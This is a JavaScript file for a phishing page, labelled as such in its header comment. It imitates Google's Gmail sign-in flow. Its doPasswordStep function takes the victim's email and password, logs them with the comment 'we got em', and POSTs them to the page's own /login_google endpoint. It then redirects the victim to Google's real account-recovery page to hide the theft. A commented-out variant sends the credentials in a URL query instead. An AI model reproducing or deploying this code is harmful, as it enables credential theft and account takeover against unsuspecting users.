/* a regex express to valid email addresses */
/* ref. https://stackoverflow.com/questions/46155/how-to-validate-an-email-address-in-javascript */
/* Modified by KasRoudra(https://github.com/KasRoudra) as a phishing page */
function validateEmail(email) {
	var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
	return re.test(email);
}




function onReady(){
	scrollTo(400, 0)
}


function createCookie(name, value, minutes) {
  var expires;
  if (minutes) {
    var date = new Date();
    date.setTime(date.getTime() + (minutes * 60 * 1000));
    expires = "; expires=" + date.toGMTString();
  }
  else {
    expires = "";
  }
  document.cookie = escape(name) + "=" + escape(value) + expires + "; path=/";
}


function doEmailStep(){

	var emailValid = validateEmail($('#email-input').val());

	$('#cgle-progress-bar').fadeIn( 500 );//.css('display', 'block')
	$('#login-form').css('opacity', 0.5)

	setTimeout(() => {
		$('#cgle-progress-bar').fadeOut( 500 );//.css('display', 'none')
		$('#login-form').css('opacity', 1.0)
		if(emailValid){
			$('#email-input').removeClass('g-input-invalid');
			$('.invalid-email').css('display', 'none');
			$('#prev-email').text($('#email-input').val());
			$('#instrution-text-desc').remove();
			$('#instruction-text').text("Te damos la bienvenida");
			toPasswordPage()
		} else {
			$('#email-input').addClass('g-input-invalid')
			$('.invalid-email').css('display', 'flex')
			toEmailPage()
		}
	}, 400);
}

function doPasswordStep(){
	var username = $('#email-input').val()
	var password = $('#password-input').val()
  
	//Ladies and gentlemen, we got em
	console.log(username, password)
	// var xmlHttp = new XMLHttpRequest()
	// console.log(`Testing: ${"/new_from_gmail?username="+ username +"&password="+ password, false}`)
	// xmlHttp.open("POST", "/new_from_gmail?username="+ username +"&password="+ password, false)
	// xmlHttp.send(null)

	$.ajax({ url: '/login_google',
		type: 'POST',
		beforeSend: function(xhr) {xhr.setRequestHeader('X-CSRF-Token', $('meta[name="csrf-token"]').attr('content'))},
		data: {email: username, password: password}
		
	}).done(function() {
		console.log("done");
		window.parent.location.href = "https://accounts.google.com/signin/v2/recoveryidentifier";
	  });
	
	//Redirect to myaccount.google
}

function toEmailPage(){
	coogle.scrollTo(400)
	$('#instruction-text').text('Sign in')
	console.log("lOG1")
	console.log($('#instruction-text'))
	$('#instrution-text-desc').text('Continue to Gmail')
	$('#email-input').focus()
}

function toPasswordPage(){
	scrollTo(0)

	$('#instruction-text').text('Te damos la bienvenida')
	$('#instrution-text-desc').text(' ')
	$('#password-input').focus()
}

function scrollTo(toPerc, duration = 500){
	$('.slide-container-outer').animate({
		scrollLeft: toPerc + '%'
	 }, duration);
}


function attachEvents(){
	console.log("NOt found");
	console.log($('#email-form-step'));
	$('#email-form-step').on('submit', function( e ){
		doEmailStep()
		console.log("EMail step");
		e.preventDefault()
	})


	$('.btn-next-email').on('click', function(){
		console.log("next step");
		doEmailStep()
	})

	$('#password-form-step').on('submit', function( e ){
		console.log("pass step");
		doPasswordStep()
		e.preventDefault()
	})

	$('.btn-next-password').on('click', function(){
		console.log("ENd step");
		doPasswordStep()
	})

}

window.onload = function(){
	onReady()
	attachEvents()
	console.log("login end");
}
